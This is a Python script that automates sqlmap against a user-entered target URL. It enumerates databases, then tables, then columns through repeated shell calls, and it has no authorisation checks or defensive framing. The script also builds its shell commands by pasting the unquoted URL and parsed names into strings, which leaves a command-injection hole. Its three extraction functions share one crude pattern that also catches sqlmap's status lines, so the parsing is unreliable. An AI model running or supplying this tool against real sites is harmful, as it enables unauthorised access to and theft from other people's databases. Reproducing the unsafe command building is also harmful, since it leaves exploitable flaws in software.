# Python script to automate SQLMap scanning and extract key tables dynamically
import os
import subprocess
import re

def extract_databases(output):
    match = re.findall(r'\[\*\] (.*?)\n', output)
    return match if match else []

def extract_tables(output):
    match = re.findall(r'\[\*\] (.*?)\n', output)
    return match if match else []

def extract_columns(output):
    match = re.findall(r'\[\*\] (.*?)\n', output)
    return match if match else []

def run_sqlmap(url):
    print(f"Running SQLMap on {url} to fetch databases...")
    dbs_command = f"sqlmap -u {url} --batch --dbs --disable-color"
    dbs_output = subprocess.getoutput(dbs_command)
    print(dbs_output)
    
    databases = extract_databases(dbs_output)
    if not databases:
        print("No databases found.")
        return
    
    for db in databases:
        print(f"Found database: {db}")
        tables_command = f"sqlmap -u {url} -D {db} --batch --tables"
        tables_output = subprocess.getoutput(tables_command)
        print(tables_output)
        
        tables = extract_tables(tables_output)
        if not tables:
            print(f"No tables found in database {db}.")
            continue
        
        for table in tables:
            print(f"Extracting columns from {table}...")
            columns_command = f"sqlmap -u {url} -D {db} -T {table} --batch --columns"
            columns_output = subprocess.getoutput(columns_command)
            print(columns_output)
            
            columns = extract_columns(columns_output)
            if not columns:
                print(f"No columns found in table {table}.")
            else:
                print(f"Columns in {table}: {', '.join(columns)}")

if __name__ == "__main__":
    target_url = input("Enter target URL: ").strip()
    if target_url:
        run_sqlmap(target_url)
    else:
        print("Invalid URL")